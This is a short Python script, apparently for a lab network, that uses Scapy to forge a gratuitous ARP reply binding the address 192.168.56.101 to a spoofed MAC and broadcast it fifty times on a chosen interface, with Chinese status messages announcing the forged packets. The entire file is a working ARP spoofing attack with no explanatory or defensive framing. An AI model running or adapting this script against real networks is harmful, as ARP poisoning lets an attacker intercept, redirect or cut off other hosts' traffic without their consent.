from scapy.all import *
iface = "ens224"
target_ip = "192.168.56.101"

arp = ARP(
    op=2,
    psrc=target_ip,
    hwsrc="aa:bb:cc:dd:ee:ff",
    pdst=target_ip,
    hwdst="ff:ff:ff:ff:ff:ff"
)

eth = Ether(src="aa:bb:cc:dd:ee:ff", dst="ff:ff:ff:ff:ff:ff")

print("[*] 发送ARP铸造包")
sendp(eth/arp, iface=iface, count=50, inter=0.1)
print("[*] 发送完成")